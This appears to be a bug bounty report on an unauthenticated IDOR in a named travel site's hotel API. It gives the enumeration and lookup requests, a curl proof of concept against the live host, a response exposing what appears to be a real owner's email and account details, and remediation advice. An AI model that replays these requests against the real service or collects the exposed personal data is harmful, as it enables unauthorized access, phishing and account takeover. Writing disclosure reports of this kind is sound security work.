# HIGH-01: Unauthenticated Hotel Owner PII Exposure via IDOR

## Severity: HIGH
**CVSS**: 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)  
**Reward Estimate**: USD 160–450

## Summary
The `GET /api/v1/hotels/{hotelId}` endpoint returns full owner user profile data without requiring authentication. This exposes PII including email, user role, account activity timestamps, and internal IDs for all hotel owners on the platform.

## Reproduction Steps

1. Enumerate any hotel UUID from the public listing:
```
GET https://api.yatraforfun.com/api/v1/hotels/public?page=1&limit=20
```

2. Access any hotel directly by UUID — no authentication required:
```
GET https://api.yatraforfun.com/api/v1/hotels/2527790c-f7db-4d0c-b10c-3c990173f7fd
```

## Proof of Concept — curl

```bash
curl -sk "https://api.yatraforfun.com/api/v1/hotels/2527790c-f7db-4d0c-b10c-3c990173f7fd"
```

### Response (truncated to sensitive fields):
```json
{
  "success": true,
  "data": {
    "id": "2527790c-f7db-4d0c-b10c-3c990173f7fd",
    "tenantId": "46990d25-d7c0-4a0e-b42b-5d233b0603a9",
    "ownerId": "612cc899-2d48-4dc7-ab4a-9164011c1fb1",
    "name": "Badreni jungle resort",
    ...
    "owner": {
      "id": "612cc899-2d48-4dc7-ab4a-9164011c1fb1",
      "createdAt": "2026-04-14T04:18:12.515Z",
      "updatedAt": "2026-05-16T16:47:51.274Z",
      "tenantId": "46990d25-d7c0-4a0e-b42b-5d233b0603a9",
      "userType": "super_admin",
      "email": "008snk@gmail.com",
      "firstName": "Super",
      "lastName": "Admin",
      "phone": null,
      "isActive": true,
      "emailVerifiedAt": "2026-04-14T04:18:12.515Z",
      "lastLoginAt": "2026-05-16T16:47:51.267Z",
      "approvalStatus": "approved"
    }
  }
}
```

## Impact
- **PII Exposure**: Hotel owner emails, names, and internal IDs exposed to anyone without authentication
- **Account Enumeration**: Attackers can enumerate all hotel owners → collect emails for phishing/spam/ATO
- **Reconnaissance**: Reveals internal user roles (super_admin, hotel_admin, travel_agent), last login times, account status
- **Scale**: 7,422 hotels in the database — all owners' data potentially exposed by iterating UUIDs from the public listing endpoint

## Root Cause
The hotel detail API endpoint does not require authentication and eagerly loads the full owner user object without stripping sensitive fields.

## Remediation
1. Require authentication for `/api/v1/hotels/{id}` endpoint, OR
2. Strip sensitive owner fields (email, phone, role, timestamps) from unauthenticated responses — return only public-facing display info
